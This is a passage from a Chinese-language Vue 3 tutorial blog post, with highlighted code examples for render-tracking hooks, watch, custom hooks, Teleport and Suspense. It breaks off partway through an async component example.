class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">girls</span>: [<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>],</span><br><span class="line">    <span class="attr">selectGirl</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">selectGirlFun</span>: <span class="function">(<span class="params">index: number</span>) =&gt;</span> &#123;</span><br><span class="line">      data.<span class="property">selectGirl</span> = data.<span class="property">girls</span>[index];</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> refData = <span class="title function_">toRefs</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">onRenderTracked</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...refData,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/21/wLlZGVzKJd96q4n.png" alt=""></p><p><code>onRenderTriggered()</code> 状态触发函数，当组件内的值改变时，会触发该函数，对外传递的 event 会显示改变值的索引以及 oldValue 与 newValue：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">girls</span>: [<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>],</span><br><span class="line">    <span class="attr">selectGirl</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">selectGirlFun</span>: <span class="function">(<span class="params">index: number</span>) =&gt;</span> &#123;</span><br><span class="line">      data.<span class="property">selectGirl</span> = data.<span class="property">girls</span>[index];</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> refData = <span class="title function_">toRefs</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Life Circle Hook</span></span><br><span class="line">  <span class="title function_">onRenderTriggered</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...refData,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>当 selectGirl 发生改变时：</p><p><img src="https://i.loli.net/2021/03/21/Xy72tzMPka6rV9o.png" alt=""></p><h1 id="6-Watch-监听"><a href="#6-Watch-监听" class="headerlink" title="6. Watch 监听"></a>6. Watch 监听</h1><p>在 Vue3 中，<code>setup()</code> 函数内可以使用 <code>watch()</code> 方法来设置监听：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Demo02&quot;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> overText = <span class="title function_">ref</span>(<span class="string">&quot;红浪漫&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">overAction</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      overText.<span class="property">value</span> = <span class="string">&quot;点餐完成|&quot;</span> + overText.<span class="property">value</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">watch</span>(overText, <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`new ----&gt; <span class="subst">$&#123;newValue&#125;</span>`</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`old ----&gt; <span class="subst">$&#123;oldValue&#125;</span>`</span>);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">title</span> = newValue;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      overText,</span><br><span class="line">      overAction,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>watch</code> 方法的第一个参数可以传入一个 Ref 对象，也可以传入一个以来数组。但是要注意的是，<strong>监听的对象只能是 getter/effect 函数、ref 对象、reactive 对象或者一个数组</strong>。如果我们想要监听 <code>reactive</code> 中转化的值的话，由于其进行过转化，取值时其就是一个值类型，因此必须将其转化为一个 “getter 函数”，如 <code>() =&gt; variable</code>，举例来说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">    <span class="attr">girls</span>: [<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>],</span><br><span class="line">    <span class="attr">selectGirl</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> refData = <span class="title function_">toRefs</span>(data);</span><br><span class="line">  <span class="keyword">const</span> overText = <span class="title function_">ref</span>(<span class="string">&quot;红浪漫&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 监听 overText 以及 selectGirl </span></span><br><span class="line">  <span class="comment">// overText =&gt; Ref&lt;string&gt; | data.selectGirl =&gt; string</span></span><br><span class="line">  <span class="title function_">watch</span>([overText, <span class="function">() =&gt;</span> data.<span class="property">selectGirl</span>], <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newValue: &quot;</span>, newValue);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;oldValue: &quot;</span>, oldValue);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = newValue[<span class="number">0</span>];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...refData,</span><br><span class="line">    overText,</span><br><span class="line">    overAction,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>Vue2 的 watch 用法同样适用于 Vue3 且无需任何特殊处理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Demo02&quot;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">data</span>: <span class="title class_">DataProps</span> = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">girls</span>: [<span class="string">&quot;大脚&quot;</span>, <span class="string">&quot;刘英&quot;</span>, <span class="string">&quot;晓红&quot;</span>],</span><br><span class="line">      <span class="attr">selectGirl</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> refData = <span class="title function_">toRefs</span>(data);</span><br><span class="line">    <span class="keyword">const</span> overText = <span class="title function_">ref</span>(<span class="string">&quot;红浪漫&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">watch</span>([overText, <span class="function">() =&gt;</span> data.<span class="property">selectGirl</span>], <span class="function">(<span class="params">newValue, oldValue</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newValue: &quot;</span>, newValue);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;oldValue: &quot;</span>, oldValue);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">title</span> = newValue[<span class="number">0</span>];</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      ...refData,</span><br><span class="line">      overText,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Vue2 监听器可以正常使用</span></span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="title function_">overText</span>(<span class="params">newVal: any</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newVal: &quot;</span>, newVal);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">selectGirl</span>(<span class="params">newVal: any</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newVal: &quot;</span>, newVal);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="6-自定义-hook"><a href="#6-自定义-hook" class="headerlink" title="6. 自定义 hook"></a>6. 自定义 hook</h1><p>与 React 相似的，Vue3 中也可以使用自定义 Hook，将逻辑代码剥离出组件。</p><p>以下的示例是演示如何抽离出一个获取当前时间的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// useNowTime.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nowTime = <span class="title function_">ref</span>(<span class="string">&quot;00:00:00&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getNowTime</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  <span class="keyword">const</span> hour = now.<span class="title function_">getHours</span>();</span><br><span class="line">  <span class="keyword">const</span> min = now.<span class="title function_">getMinutes</span>();</span><br><span class="line">  <span class="keyword">const</span> sec = now.<span class="title function_">getSeconds</span>();</span><br><span class="line">  nowTime.<span class="property">value</span> = <span class="string">`<span class="subst">$&#123;hour&#125;</span>:<span class="subst">$&#123;min&#125;</span>:<span class="subst">$&#123;sec&#125;</span>`</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(getNowTime, <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; nowTime, getNowTime &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// Demo03.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; nowTime &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;button @click=&quot;getNowTime&quot;&gt;获取时间&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; nowTime, getNowTime &#125; from &quot;./hooks/useNowTime&quot;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;Demo03&quot;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      nowTime,</span><br><span class="line">      getNowTime,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/OhYQdLwMk3iTl6K.png" alt=""></p><p>当然，我们完全可以模仿 react hook 的写法，将 useHook 文件导出一个方法：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// useNowTime.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">useNowTime</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> nowTime = <span class="title function_">ref</span>(<span class="string">&quot;00:00:00&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">getNowTime</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">const</span> hour = now.<span class="title function_">getHours</span>();</span><br><span class="line">    <span class="keyword">const</span> min = now.<span class="title function_">getMinutes</span>();</span><br><span class="line">    <span class="keyword">const</span> sec = now.<span class="title function_">getSeconds</span>();</span><br><span class="line">    nowTime.<span class="property">value</span> = <span class="string">`<span class="subst">$&#123;hour&#125;</span>:<span class="subst">$&#123;min&#125;</span>:<span class="subst">$&#123;sec&#125;</span>`</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(getNowTime, <span class="number">1000</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; nowTime, getNowTime &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> useNowTime;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// Demo03.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; nowTime &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;button @click=&quot;getNowTime&quot;&gt;获取时间&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import useNowTime from &quot;./hooks/useNowTime&quot;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;Demo03&quot;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const &#123; nowTime, getNowTime &#125; = useNowTime();</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      nowTime,</span><br><span class="line">      getNowTime,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="7-Teleport"><a href="#7-Teleport" class="headerlink" title="7. Teleport"></a>7. Teleport</h1><p>Teleport 被称为瞬间移动组件，是 Vue3 新增的组件。它可以更便捷的将组件的 Dom 节点挂载到目标节点中，这对于我们写一些全局组件非常有用，比如 Alert、Modal、Notification 组件。</p><p>以 Modal 组件为例，我们会将 Modal 组件的 Wrapper 设置为相对定位，让其覆盖整个屏幕，写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// Modal.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;modal&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;modal-content center&quot;&gt;</span><br><span class="line">      &lt;h2&gt;EsunR.xyz&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;&quot;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.modal &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  position: absolute;</span><br><span class="line">  background-color: rgba(0, 0, 0, 0.5);</span><br><span class="line">  left: 0;</span><br><span class="line">  top: 0;</span><br><span class="line">  .center &#123;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    border: 2px solid #000000;</span><br><span class="line">    background: #ffffff;</span><br><span class="line">    left: 50%;</span><br><span class="line">    top: 50%;</span><br><span class="line">    transform: translate(-50%, -50%);</span><br><span class="line">    position: absolute;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>然而当页面逐渐复杂，我们在页面中使用这个组件时，组件会被挂载到调用的位置时，如果父级 Dom 节点的样式设置了定位，那么就会对 Modal 组件的定位产生影响，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;Demo05&quot;&gt;</span><br><span class="line">    &lt;Modal /&gt;</span><br><span class="line">    &lt;h1&gt;Demo05&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      Vue 鼓励我们通过将 UI 和相关行为封装到组件中来构建</span><br><span class="line">      UI。我们可以将它们嵌套在另一个内部，以构建一个组成应用程序 UI 的树。</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      然而，有时组件模板的一部分逻辑上属于该组件，而从技术角度来看，最好将模板的这一部分移动到</span><br><span class="line">      DOM 中 Vue app 之外的其他位置。</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      一个常见的场景是创建一个包含全屏模式的组件。在大多数情况下，你希望模态的逻辑存在于组件中，但是模态的定位很快就很难通过</span><br><span class="line">      CSS 来解决，或者需要更改组件组合。</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import Modal from &quot;./components/Modal.vue&quot;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;Demo05&quot;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Modal,</span><br><span class="line">  &#125;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">#Demo05 &#123;</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>此时页面会表现为：</p><p><img src="https://i.loli.net/2021/03/27/5vptRrBD964hTZw.png" alt=""></p><p>Dom 节点结构为：</p><p><img src="https://i.loli.net/2021/03/27/NwRWSunJ9mlc37B.png" alt=""></p><p>要解决这个问题，我们就必须要想办法把 Modal 组件移出去。在 Vue2 中，我们可以通过<a href="https://cn.vuejs.org/v2/guide/render-function.html">渲染函数</a>来将渲染内容指定渲染在 HTML 的任意目标位置，其核心是在生成虚拟 DOM 后对其进行 <code>targetDom.appendChild(virtualDom)</code> 操作。</p><p>在 Vue3 中，我们可以直接使用 <code>Teleport</code> 组件来将组件渲染到页面的指定位置，因此我们只需要更改我们的 Modal 组件为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;teleport to=&quot;body&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;modal&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;modal-content center&quot;&gt;</span><br><span class="line">        &lt;h2&gt;EsunR.xyz&lt;/h2&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/teleport&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>此时 Modal 组件表现完全正常，因为其直接挂载到了 body 节点中：</p><p><img src="https://i.loli.net/2021/03/27/SRDH235GbPurwn7.png" alt=""></p><h1 id="8-Suspense"><a href="#8-Suspense" class="headerlink" title="8. Suspense"></a>8. Suspense</h1><p><code>Suspense</code> 是 vue3 中新增的组件，类似于 <code>keep-alive</code> 不需要任何的引入，可以直接进行使用。自带两个 <code>slot</code> 分别为 <code>default、fallback</code>。顾名思义，当要加载的组件不满足状态时,<code>Suspense</code> 将回退到 <code>fallback</code>状态一直到加载的组件满足条件，才会进行渲染。</p><p>在官方示例中，<code>Suspense</code> 与 <a href="https://vue3js.cn/docs/zh/guide/component-dynamic-async.html#%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6">异步组件（defineAsyncComponent）</a> 配合使用的。当异步组件加载时可以为用户显示一个 loading 界面，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Suspense&gt;</span><br><span class="line">      &lt;template #default&gt;</span><br><span class="line">        &lt;AsyncComponent /&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">      &lt;template #fallback&gt;</span><br><span class="line">        &lt;h2&gt;Loading... ...&lt;/h2&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/Suspense&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>其实除了使用 <code>defineAsyncComponent</code> 声明的异步组件外，组件的 <code>setup()</code> 函数如果是一个 async 函数的话，该组件也属于一个异步组件，也可以使用 <code>Suspense</code> 来显示组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// AsyncShow.vue</span><br><span class="line">// 获取图片的异步组件</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div 